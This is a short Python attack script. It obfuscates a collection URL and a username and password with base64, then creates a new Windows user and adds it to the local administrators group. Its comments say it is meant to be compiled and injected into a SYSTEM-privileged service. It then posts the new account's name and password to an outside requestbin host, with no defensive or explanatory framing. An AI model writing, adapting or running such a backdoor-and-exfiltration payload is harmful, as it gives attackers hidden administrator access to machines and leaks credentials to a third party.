#This script creates a user and adds it to local admin group
#The script needs to be compiled to exe and injected into a service running System privs.
import requests, time, os, base64

#Base64 encoded string with requestbin address.  See http://requestb.in/ for more info.
#uri_string decoded 'http://requestb.in/u4ou5yu4'
uri_string = 'aHR0cDovL3JlcXVlc3RiLmluL3U0b3U1eXU0'
#Base64 encoded string containing username
 #user_string decoded "lowpriv"
user_string ='bG93cHJpdg=='
#Base64 string containing password
#pass_string decoded "IBringDaH34t!"
pass_string = "'SUJyaW5nRGFIMzR0IQ=='"
#decode uri, user, and pass strings
uri = base64.b64decode(uri_string)
user = base64.b64decode(user_string)
passwd = base64.b64decode(pass_string)

response = os.system("net user " + user + " " + passwd + " /add")
if response == 0:
    status = "Success"
    response = os.system("net localgroup administrators " + user + " /add")
    if response != 0:
        status = "Failure"
else:
    status = "Failure"
    
if status == "Success":
    requests.post(uri, data={"timestamp":time.time(), "status":status, "u":user, "p":passwd})
else:
    requests.post(uri, data={"timestamp":time.time(), "status":status})